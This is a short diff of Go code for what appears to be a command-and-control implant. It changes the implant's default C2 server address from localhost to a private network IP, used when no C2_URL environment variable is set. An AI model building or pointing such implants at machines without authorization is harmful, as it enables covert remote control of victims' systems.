@@ -263,7 +263,7 @@ func getOSVersion() string {
 func main() {
 	c2ServerURL := os.Getenv("C2_URL")
 	if c2ServerURL == "" {
-		c2ServerURL = "http://127.0.0.1:5000"
+		c2ServerURL = "http://192.168.0.115:5000"
 	}
 
 	implant := NewImplant(c2ServerURL)
